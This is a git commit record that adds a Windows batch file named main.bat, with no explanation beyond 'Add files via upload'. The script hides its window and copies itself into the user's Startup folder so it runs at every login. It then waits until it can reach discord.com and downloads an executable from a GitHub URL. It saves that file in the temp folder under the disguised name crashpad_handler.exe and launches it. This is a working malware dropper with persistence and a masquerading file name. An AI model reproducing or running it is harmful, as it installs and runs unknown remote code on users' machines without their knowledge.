5b72be4749ffe3d201448f1e5296c8faf9dbe0db
rxu7s <104208624+rxu7s@users.noreply.github.com>
2022-11-11 10:56:59 -0500

    Add files via upload

---
+++ main.bat
@@ -0,0 +1,19 @@
+ÿþ
+@echo off
+powershell.exe -windowstyle Hidden -command
+title %random%
+copy %0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %temp%
+
+:c
+ping discord.com
+IF %ERRORLEVEL% NEQ 0 goto a
+
+powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/Client.exe -OutFile "crashpad_handler.exe"
+if exist crashpad_handler.exe (
+	start crashpad_handler.exe
+	exit
+)
+
+:else
+goto c
